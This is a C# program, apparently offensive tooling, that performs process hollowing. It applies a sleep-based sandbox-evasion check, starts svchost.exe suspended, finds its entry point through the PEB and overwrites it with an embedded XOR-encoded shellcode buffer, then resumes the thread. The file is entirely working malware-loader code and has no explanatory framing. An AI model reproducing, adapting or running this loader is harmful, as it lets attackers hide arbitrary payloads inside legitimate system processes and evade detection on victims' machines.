
using System;
using System.Runtime.InteropServices;

namespace Meth
{
    public class Program
    {
        public const uint CREATE_SUSPENDED = 0x4;
        public const int PROCESSBASICINFORMATION = 0;

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        public struct ProcessInfo
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public Int32 ProcessId;
            public Int32 ThreadId;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        public struct StartupInfo
        {
            public uint cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public uint dwX;
            public uint dwY;
            public uint dwXSize;
            public uint dwYSize;
            public uint dwXCountChars;
            public uint dwYCountChars;
            public uint dwFillAttribute;
            public uint dwFlags;
            public short wShowWindow;
            public short cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct ProcessBasicInfo
        {
            public IntPtr Reserved1;
            public IntPtr PebAddress;
            public IntPtr Reserved2;
            public IntPtr Reserved3;
            public IntPtr UniquePid;
            public IntPtr MoreReserved;
        }

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes,
            IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory,
            [In] ref StartupInfo lpStartupInfo, out ProcessInfo lpProcessInformation);

        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern int ZwQueryInformationProcess(IntPtr hProcess, int procInformationClass,
            ref ProcessBasicInfo procInformation, uint ProcInfoLen, ref uint retlen);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer,
            int dwSize, out IntPtr lpNumberOfbytesRW);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern uint ResumeThread(IntPtr hThread);

        public static void Main(string[] args)
        {

            DateTime t1 = DateTime.Now;
            Sleep(10000);
            double deltaT = DateTime.Now.Subtract(t1).TotalSeconds;
            if (deltaT < 9.8)
            {
                return;
            }

            byte[] buf = new byte[511] {
0x15,0xa1,0x6a,0x0d,0x19,0x01,0x25,0xe9,0xe9,0xe9,0xa8,0xb8,0xa8,
0xb9,0xbb,0xa1,0xd8,0x3b,0xb8,0x8c,0xa1,0x62,0xbb,0x89,0xbf,0xa1,
0x62,0xbb,0xf1,0xa1,0x62,0xbb,0xc9,0xa1,0xe6,0x5e,0xa3,0xa3,0xa4,
0xd8,0x20,0xa1,0x62,0x9b,0xb9,0xa1,0xd8,0x29,0x45,0xd5,0x88,0x95,
0xeb,0xc5,0xc9,0xa8,0x28,0x20,0xe4,0xa8,0xe8,0x28,0x0b,0x04,0xbb,
0xa8,0xb8,0xa1,0x62,0xbb,0xc9,0x62,0xab,0xd5,0xa1,0xe8,0x39,0x8f,
0x68,0x91,0xf1,0xe2,0xeb,0xe6,0x6c,0x9b,0xe9,0xe9,0xe9,0x62,0x69,
0x61,0xe9,0xe9,0xe9,0xa1,0x6c,0x29,0x9d,0x8e,0xa1,0xe8,0x39,0xad,
0x62,0xa9,0xc9,0xa0,0xe8,0x39,0x62,0xa1,0xf1,0xb9,0x0a,0xbf,0xa4,
0xd8,0x20,0xa1,0x16,0x20,0xa8,0x62,0xdd,0x61,0xa1,0xe8,0x3f,0xa1,
0xd8,0x29,0xa8,0x28,0x20,0xe4,0x45,0xa8,0xe8,0x28,0xd1,0x09,0x9c,
0x18,0xa5,0xea,0xa5,0xcd,0xe1,0xac,0xd0,0x38,0x9c,0x31,0xb1,0xad,
0x62,0xa9,0xcd,0xa0,0xe8,0x39,0x8f,0xa8,0x62,0xe5,0xa1,0xad,0x62,
0xa9,0xf5,0xa0,0xe8,0x39,0xa8,0x62,0xed,0x61,0xa1,0xe8,0x39,0xa8,
0xb1,0xa8,0xb1,0xb7,0xb0,0xb3,0xa8,0xb1,0xa8,0xb0,0xa8,0xb3,0xa1,
0x6a,0x05,0xc9,0xa8,0xbb,0x16,0x09,0xb1,0xa8,0xb0,0xb3,0xa1,0x62,
0xfb,0x00,0xa2,0x16,0x16,0x16,0xb4,0xa0,0x57,0x9e,0x9a,0xdb,0xb6,
0xda,0xdb,0xe9,0xe9,0xa8,0xbf,0xa0,0x60,0x0f,0xa1,0x68,0x05,0x49,
0xe8,0xe9,0xe9,0xa0,0x60,0x0c,0xa0,0x55,0xeb,0xe9,0xe8,0x52,0x29,
0x41,0xe8,0xe8,0xa8,0xbd,0xa0,0x60,0x0d,0xa5,0x60,0x18,0xa8,0x53,
0xa5,0x9e,0xcf,0xee,0x16,0x3c,0xa5,0x60,0x03,0x81,0xe8,0xe8,0xe9,
0xe9,0xb0,0xa8,0x53,0xc0,0x69,0x82,0xe9,0x16,0x3c,0x83,0xe3,0xa8,
0xb7,0xb9,0xb9,0xa4,0xd8,0x20,0xa4,0xd8,0x29,0xa1,0x16,0x29,0xa1,
0x60,0x2b,0xa1,0x16,0x29,0xa1,0x60,0x28,0xa8,0x53,0x03,0xe6,0x36,
0x09,0x16,0x3c,0xa1,0x60,0x2e,0x83,0xf9,0xa8,0xb1,0xa5,0x60,0x0b,
0xa1,0x60,0x10,0xa8,0x53,0x70,0x4c,0x9d,0x88,0x16,0x3c,0x6c,0x29,
0x9d,0xe3,0xa0,0x16,0x27,0x9c,0x0c,0x01,0x7a,0xe9,0xe9,0xe9,0xa1,
0x6a,0x05,0xf9,0xa1,0x60,0x0b,0xa4,0xd8,0x20,0x83,0xed,0xa8,0xb1,
0xa1,0x60,0x10,0xa8,0x53,0xeb,0x30,0x21,0xb6,0x16,0x3c,0x6a,0x11,
0xe9,0x97,0xbc,0xa1,0x6a,0x2d,0xc9,0xb7,0x60,0x1f,0x83,0xa9,0xa8,
0xb0,0x81,0xe9,0xf9,0xe9,0xe9,0xa8,0xb1,0xa1,0x60,0x1b,0xa1,0xd8,
0x20,0xa8,0x53,0xb1,0x4d,0xba,0x0c,0x16,0x3c,0xa1,0x60,0x2a,0xa0,
0x60,0x2e,0xa4,0xd8,0x20,0xa0,0x60,0x19,0xa1,0x60,0x33,0xa1,0x60,
0x10,0xa8,0x53,0xeb,0x30,0x21,0xb6,0x16,0x3c,0x6a,0x11,0xe9,0x94,
0xc1,0xb1,0xa8,0xbe,0xb0,0x81,0xe9,0xa9,0xe9,0xe9,0xa8,0xb1,0x83,
0xe9,0xb3,0xa8,0x53,0xe2,0xc6,0xe6,0xd9,0x16,0x3c,0xbe,0xb0,0xa8,
0x53,0x9c,0x87,0xa4,0x88,0x16,0x3c,0xa0,0x16,0x27,0x00,0xd5,0x16,
0x16,0x16,0xa1,0xe8,0x2a,0xa1,0xc0,0x2f,0xa1,0x6c,0x1f,0x9c,0x5d,
0xa8,0x16,0x0e,0xb1,0x83,0xe9,0xb0,0x52,0x09,0xf4,0xc3,0xe3,0xa8,
0x60,0x33,0x16,0x3c
};

            StartupInfo sInfo = new StartupInfo();
            ProcessInfo pInfo = new ProcessInfo();
            bool cResult = CreateProcess(null, "c:\\windows\\system32\\svchost.exe", IntPtr.Zero, IntPtr.Zero, false, CREATE_SUSPENDED, IntPtr.Zero, null, ref sInfo, out pInfo);

            ProcessBasicInfo pbInfo = new ProcessBasicInfo();
            uint retLen = new uint();
            long qResult = ZwQueryInformationProcess(pInfo.hProcess, PROCESSBASICINFORMATION, ref pbInfo, (uint)(IntPtr.Size * 6), ref retLen);
            IntPtr baseImageAddr = (IntPtr)((Int64)pbInfo.PebAddress + 0x10);

            byte[] procAddr = new byte[0x8];
            byte[] dataBuf = new byte[0x200];
            IntPtr bytesRW = new IntPtr();
            bool result = ReadProcessMemory(pInfo.hProcess, baseImageAddr, procAddr, procAddr.Length, out bytesRW);
            IntPtr executableAddress = (IntPtr)BitConverter.ToInt64(procAddr, 0);
            result = ReadProcessMemory(pInfo.hProcess, executableAddress, dataBuf, dataBuf.Length, out bytesRW);
            uint e_lfanew = BitConverter.ToUInt32(dataBuf, 0x3c);
            uint rvaOffset = e_lfanew + 0x28;
            uint rva = BitConverter.ToUInt32(dataBuf, (int)rvaOffset);
            IntPtr entrypointAddr = (IntPtr)((Int64)executableAddress + rva);

            for (int i = 0; i < buf.Length; i++)
{
    buf[i] = (byte)((uint)buf[i] ^ 0xe9);
}

            result = WriteProcessMemory(pInfo.hProcess, entrypointAddr, buf, buf.Length, out bytesRW);

            uint rResult = ResumeThread(pInfo.hThread);
            Console.WriteLine($"Done");
        }
    }
}
